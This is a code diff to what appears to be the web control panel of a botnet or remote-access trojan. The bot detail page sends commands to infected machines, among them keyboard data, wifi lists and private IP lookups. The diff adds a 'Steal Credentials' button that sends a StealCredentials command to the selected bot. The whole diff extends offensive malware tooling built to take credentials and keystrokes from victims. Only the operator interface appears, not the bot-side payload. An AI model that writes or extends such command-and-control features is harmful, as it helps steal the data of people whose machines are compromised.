@@ -38,7 +38,7 @@ export interface Channel {
     commands: any[]
 }
 
-const backendUrl = "http://localhost:4000/backend";
+const backendUrl = "http://localhost:3000/backend";
 const pullingInterval = 3000;
 
 export default function BotDetailPage() {
@@ -129,6 +129,12 @@ export default function BotDetailPage() {
         const res = await sendCommand(currentBot, "Ping", {
             targetIp: ping
         })
+        commandSent()
+        await getChannel()
+    }
+
+    async function handleCredentials() {
+        const res = await sendCommand(currentBot, "StealCredentials", {})
         commandSent()
         await getChannel()
     }
@@ -337,6 +343,7 @@ export default function BotDetailPage() {
                                 <Button colorScheme='blue' onClick={handlePrivateIp}>Get Private Ip</Button>
                                 <Button colorScheme='blue' onClick={handleKeyboardData}>Keyboard Data</Button>
                                 <Button colorScheme='blue' onClick={handleWifi}>Wifi list</Button>
+                                <Button colorScheme='blue' onClick={handleCredentials}>Steal Credentials</Button>
                             </div>
                             <br/>
                             <InputGroup>
